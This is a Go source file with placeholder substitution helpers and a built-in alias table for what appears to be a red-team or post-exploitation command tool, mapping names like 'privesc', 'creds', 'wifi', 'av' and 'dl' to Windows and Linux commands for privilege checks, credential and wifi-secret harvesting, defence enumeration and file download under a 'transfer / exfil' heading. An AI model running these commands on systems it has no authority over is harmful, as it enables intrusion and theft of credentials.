package main

import (
	"fmt"
	"regexp"
	"strconv"
)

// Alias holds the OS-specific command templates for a named alias.
type Alias struct {
	Windows string
	Linux   string
}

// placeholderRe matches {N} placeholders in alias command templates.
var placeholderRe = regexp.MustCompile(`\{(\d+)\}`)

// substituteArgs replaces {0}, {1}, etc. in cmd with the corresponding
// args values. Returns an error if there are not enough args.
func substituteArgs(cmd string, args []string) (string, error) {
	maxIdx := -1
	matches := placeholderRe.FindAllStringSubmatch(cmd, -1)
	for _, m := range matches {
		idx, err := strconv.Atoi(m[1])
		if err != nil {
			continue
		}
		if idx > maxIdx {
			maxIdx = idx
		}
	}
	if maxIdx < 0 {
		// No placeholders — return as-is.
		return cmd, nil
	}
	needed := maxIdx + 1
	if len(args) < needed {
		return "", fmt.Errorf("needs %d arg(s), got %d", needed, len(args))
	}
	result := placeholderRe.ReplaceAllStringFunc(cmd, func(match string) string {
		sub := placeholderRe.FindStringSubmatch(match)
		idx, _ := strconv.Atoi(sub[1])
		return args[idx]
	})
	return result, nil
}

// countFields returns the number of unique {N} placeholders in cmd.
func countFields(cmd string) int {
	seen := map[int]bool{}
	matches := placeholderRe.FindAllStringSubmatch(cmd, -1)
	for _, m := range matches {
		idx, err := strconv.Atoi(m[1])
		if err != nil {
			continue
		}
		seen[idx] = true
	}
	return len(seen)
}

// defaultAliases returns the built-in alias table matching the Python version.
func defaultAliases() map[string]*Alias {
	return map[string]*Alias{
		// identity / privilege
		"whoami":  {Windows: "whoami /all", Linux: "id"},
		"privesc": {Windows: "whoami /priv", Linux: "sudo -l; find / -perm -4000 -type f 2>/dev/null"},

		// system info
		"sysinfo":   {Windows: "systeminfo", Linux: "uname -a; cat /etc/os-release"},
		"env":       {Windows: "set", Linux: "env"},
		"drives":    {Windows: "wmic logicaldisk get name,size", Linux: "df -h"},
		"services":  {Windows: "sc query type= running", Linux: "systemctl list-units --type=service --state=running"},
		"installed": {Windows: "wmic product get name,version", Linux: "dpkg -l"},
		"av":        {Windows: `wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname`, Linux: "which clamscan; systemctl status clamav-daemon 2>/dev/null"},
		"tasks":     {Windows: "schtasks /query /fo LIST", Linux: "crontab -l; ls -la /etc/cron*"},

		// network
		"net":      {Windows: "ipconfig /all", Linux: "ip a"},
		"arp":      {Windows: "arp -a", Linux: "arp -n"},
		"routes":   {Windows: "route print", Linux: "ip route"},
		"ports":    {Windows: "netstat -ano", Linux: "ss -tulpn"},
		"firewall": {Windows: "netsh advfirewall show all", Linux: "iptables -L -n"},
		"shares":   {Windows: "net share", Linux: "showmount -e"},
		"hosts":    {Windows: `type C:\Windows\System32\drivers\etc\hosts`, Linux: "cat /etc/hosts"},

		// users / accounts
		"users":  {Windows: "net user", Linux: "cat /etc/passwd"},
		"admins": {Windows: "net localgroup administrators", Linux: "cat /etc/group | grep -E 'sudo|wheel'"},
		"creds":  {Windows: "cmdkey /list", Linux: "cat ~/.netrc 2>/dev/null"},
		"wifi":   {Windows: "netsh wlan show profiles", Linux: "nmcli -s connection show"},

		// process / activity
		"ps":      {Windows: "Get-Process", Linux: "ps aux"},
		"history": {Windows: "Get-History", Linux: "cat ~/.bash_history"},

		// filesystem
		"pwd": {Windows: "cd", Linux: "pwd"},
		"ls":  {Windows: "dir", Linux: "ls -la"},
		"ssh": {Windows: `dir %userprofile%\.ssh`, Linux: "ls ~/.ssh"},

		// transfer / exfil
		"dl":       {Windows: "iwr -Uri {0} -OutFile {1}", Linux: "curl -fsSL {0} -o {1}"},
		"download": {Windows: "iwr -Uri {0} -OutFile {1}", Linux: "curl -fsSL {0} -o {1}"},
		"b64enc":   {Windows: "certutil -encode {0} con", Linux: "base64 {0}"},
	}
}
